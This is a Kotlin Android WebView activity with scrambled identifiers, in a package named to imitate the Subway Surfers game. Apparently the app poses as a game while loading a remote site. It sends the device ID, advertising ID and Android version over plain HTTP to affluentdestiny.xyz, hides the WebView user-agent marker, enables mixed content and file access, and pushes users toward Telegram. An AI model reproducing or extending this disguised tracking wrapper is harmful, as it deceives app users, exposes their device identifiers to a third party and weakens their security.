package com.kiloo.subwaysurfd

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.webkit.*
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.kiloo.subwaysurfd.ApolonCLas.Companion.CCCCC1
import com.kiloo.subwaysurfd.ApolonCLas.Companion.sisisisiter
import com.kiloo.subwaysurfd.ApolonCLas.Companion.mainaminamianId
import com.kiloo.subwaysurfd.databinding.ActivityViiibiBinding
import com.onesignal.OneSignal
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class ViiibiActivity : AppCompatActivity() {

    var frgttg: String? = null
    lateinit var vvdfrgt: WebView

    private val FILECHOOSERRESULTCODEfrfr = 1

    var fgthyhyhyyyhy: ValueCallback<Array<Uri>>? = null

    lateinit var drfgtgtgtgtg: ActivityViiibiBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        drfgtgtgtgtg = ActivityViiibiBinding.inflate(layoutInflater)
        setContentView(drfgtgtgtgtg.root)
        vvdfrgt = drfgtgtgtgtg.viiiiiiiiiewWeb
        Snackbar.make(
            drfgtgtgtgtg.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()

        val ccccccccccccccccolman = CookieManager.getInstance()
        ccccccccccccccccolman.setAcceptCookie(true)
        ccccccccccccccccolman.setAcceptThirdPartyCookies(vvdfrgt, true)
        webSettings()
        val aaaaaaaaactivity: Activity = this

        vvdfrgt.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (flglglglhkkjjkksss5(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                saveUrldrfrgfggljd(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(aaaaaaaaactivity, description, Toast.LENGTH_SHORT).show()
            }


        }
        vvdfrgt.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                fgthyhyhyyyhy?.onReceiveValue(null)
                fgthyhyhyyyhy = filePathCallback
                var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntent!!.resolveActivity(packageManager) != null) {

                    var ppppppppppfile: File? = null
                    try {
                        ppppppppppfile = createImageFile()
                        takePictureIntent.putExtra("PhotoPath", frgttg)
                    } catch (ex: IOException) {
                    }

                    if (ppppppppppfile != null) {
                        frgttg = "file:" + ppppppppppfile.absolutePath
                        takePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(ppppppppppfile)
                        )
                    } else {
                        takePictureIntent = null
                    }
                }
                val ccccccccontslmennnn = Intent(Intent.ACTION_GET_CONTENT)
                ccccccccontslmennnn.addCategory(Intent.CATEGORY_OPENABLE)
                ccccccccontslmennnn.type = "image/*"
                val iiiiintarrrrr: Array<Intent?> =
                    takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val rfgthyhyyh = Intent(Intent.ACTION_CHOOSER)
                rfgthyhyyh.putExtra(Intent.EXTRA_INTENT, ccccccccontslmennnn)
                rfgthyhyyh.putExtra(Intent.EXTRA_TITLE, getString(R.string.dfgtimage_chooserefrgt))
                rfgthyhyyh.putExtra(Intent.EXTRA_INITIAL_INTENTS, iiiiintarrrrr)
                startActivityForResult(
                    rfgthyhyyh, FILECHOOSERRESULTCODEfrfr
                )
                return true
            }

            @Throws(IOException::class)
            private fun createImageFile(): File {
                var imageStorageDirrrrrrrrrr = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDirrrrrrrrrr.exists()) {
                    imageStorageDirrrrrrrrrr.mkdirs()
                }

                imageStorageDirrrrrrrrrr =
                    File(imageStorageDirrrrrrrrrr.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDirrrrrrrrrr
            }

        }

        vvdfrgt.loadUrl(ggggggetuuuuuuuurl())
    }


    private fun pushToOneSignalllllllllll(string: String) {

        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isisfrgttisPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isisfrgttisPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccessdfrtgt =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccessdfrtgt"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccessedfrfgt5 = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccessedfrfgt5"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun webSettings() {
        val sssssssssetvebbbb = vvdfrgt.settings
        sssssssssetvebbbb.javaScriptEnabled = true

        sssssssssetvebbbb.useWideViewPort = true

        sssssssssetvebbbb.loadWithOverviewMode = true
        sssssssssetvebbbb.allowFileAccess = true
        sssssssssetvebbbb.domStorageEnabled = true
        sssssssssetvebbbb.userAgentString = sssssssssetvebbbb.userAgentString.replace("; wv", "")

        sssssssssetvebbbb.javaScriptCanOpenWindowsAutomatically = true
        sssssssssetvebbbb.setSupportMultipleWindows(false)

        sssssssssetvebbbb.displayZoomControls = false
        sssssssssetvebbbb.builtInZoomControls = true
        sssssssssetvebbbb.setSupportZoom(true)

        sssssssssetvebbbb.pluginState = WebSettings.PluginState.ON
        sssssssssetvebbbb.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        sssssssssetvebbbb.setAppCacheEnabled(true)

        sssssssssetvebbbb.allowContentAccess = true
    }

    private fun ggggggetuuuuuuuurl(): String {

        val ssssssspppppoooonn = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val frfrfrfglgglglgl = getSharedPreferences("SP", MODE_PRIVATE)

        val pppppppppppppack = "com.kiloo.subwaysurfd"

        val ccccccccpOneeeeeee: String? = frfrfrfglgglglgl.getString(CCCCC1, "null")
        val dddddddppppppOne: String? = frfrfrfglgglglgl.getString(sisisisiter, "null")
        val mmmmmmmmmaaaaaaainid: String? = frfrfrfglgglglgl.getString(mainaminamianId, null)



        val aaaaaaaaaaaafffffffId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val foureeeeeee = "sub_id_4="
        val ggggggggfive = "sub_id_5="
        val sixqqqqqqq = "sub_id_6="
        val oneuuuuuuuuuu = "sub_id_1="
        val twoiiiiiiiii = "deviceID="
        val threeedfrrfrgr = "ad_id="



        val refrfggrgjkkkk = "http://"
        val sddeffrrrggr = "affluentdestiny.xyz/go.php?to=2&"

        val uuuuuuuuuuuuukkll = "naming"
        val loooooooooolool = "deeporg"

        val androidVersionjukikikki = Build.VERSION.RELEASE

        val resultABfffffffffffaaaadcvf = refrfggrgjkkkk + sddeffrrrggr

        var ferfrrgtrgjkkllllll = ""
        if (ccccccccpOneeeeeee != "null") {
            ferfrrgtrgjkkllllll =
                "$resultABfffffffffffaaaadcvf$oneuuuuuuuuuu$ccccccccpOneeeeeee&$twoiiiiiiiii$aaaaaaaaaaaafffffffId&$threeedfrrfrgr$mmmmmmmmmaaaaaaainid&$foureeeeeee$pppppppppppppack&$ggggggggfive$androidVersionjukikikki&$sixqqqqqqq$uuuuuuuuuuuuukkll"
        } else {
            ferfrrgtrgjkkllllll =
                "$resultABfffffffffffaaaadcvf$oneuuuuuuuuuu$dddddddppppppOne&$twoiiiiiiiii$aaaaaaaaaaaafffffffId&$threeedfrrfrgr$mmmmmmmmmaaaaaaainid&$foureeeeeee$pppppppppppppack&$ggggggggfive$androidVersionjukikikki&$sixqqqqqqq$loooooooooolool"
        }
        pushToOneSignalllllllllll(aaaaaaaaaaaafffffffId.toString())
        return ssssssspppppoooonn.getString("SAVED_URL", ferfrrgtrgjkkllllll).toString()
    }


    private fun flglglglhkkjjkksss5(uri: String): Boolean {

        val ppppppmmmmemmemom = packageManager
        try {

            ppppppmmmmemmemom.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != FILECHOOSERRESULTCODEfrfr || fgthyhyhyyyhy == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                results = arrayOf(Uri.parse(frgttg))
            } else {
                val dataStringedfrgtgttg = data.dataString
                if (dataStringedfrgtgttg != null) {
                    results = arrayOf(Uri.parse(dataStringedfrgtgttg))
                }
            }
        }
        fgthyhyhyyyhy?.onReceiveValue(results)
        fgthyhyhyyyhy = null
    }
    var fffffperurl = ""
    fun saveUrldrfrgfggljd(url: String?) {
        if (!url!!.contains("t.me")) {

            if (fffffperurl == "") {
                fffffperurl = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val sp = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val editor = sp.edit()
                editor.putString("SAVED_URL", url)
                editor.apply()
            }
        }
    }


    private var dfrgthytkkkkpreees = false
    override fun onBackPressed() {


        if (vvdfrgt.canGoBack()) {
            if (dfrgthytkkkkpreees) {
                vvdfrgt.stopLoading()
                vvdfrgt.loadUrl(fffffperurl)
            }
            this.dfrgthytkkkkpreees = true
            vvdfrgt.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                dfrgthytkkkkpreees = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }


}